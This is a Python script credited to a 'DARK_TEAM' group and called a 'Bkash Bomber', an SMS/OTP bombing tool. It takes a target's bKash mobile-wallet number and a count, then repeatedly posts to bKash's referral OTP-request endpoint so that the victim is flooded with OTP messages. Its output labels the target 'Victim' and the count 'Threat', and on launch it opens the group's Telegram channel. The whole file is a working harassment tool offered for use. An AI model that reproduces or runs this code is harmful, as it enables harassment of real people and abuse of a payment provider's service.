#!/usr/bin/python3
#!/coded/by/@DARK_LMNx999

# JOIN ➤ t.me/DARK_TEAM_LMNx9

import os,time,json
try:
    import requests
except ImportError:
    os.system("pip install requests")
try:
    import rich
except ImportError:
    os.system("pip install rich")

import requests,rich    
from rich import print
from rich import print_json

credit={
    "Codded By": "Limon_Hossain",
    "TG": "DARK_TEAM_LMNx9",
    "GitHub": "LMNx9-JOHNY",
    "Tool": "Bkash Bomber"
    }
    
def logo():
    logo = ("""[bold purple]
    [YOUR LOGO HERE]
    """)
    os.system('clear')
    print(logo)

def LMNx9():
    logo()
    print_json(data=credit)
    print("\n [bold purple]Enter Bkash Number ")
    nm=input("\t\t➤")
    print("\n [bold blue]Enter Bombing Amount ")
    am=int(input("\t\t➤"))
    
    for i in range(am):
        source = {
            "referrerWallet": nm
        }
        ls = requests.post("https://cpp.bka.sh/external-services/referral/report/otp/request", params=source)
        
        lmnx9={
            "Victim": nm,
            "Threat": am,
            "Status": "success",
            "Author": "DARK_TEAM_LMNx9"
            }
            
        print_json(data=lmnx9)
            
    while True:
        print("\n[bold tan] LMNx9 BOMBING COMPLETE")
        print("\n [bold blue]Press Enter To Back Main")
        input("\t\t\t")
        LMNx9()

os.system('xdg-open https://t.me/DARK_TEAM_LMNx9')
LMNx9()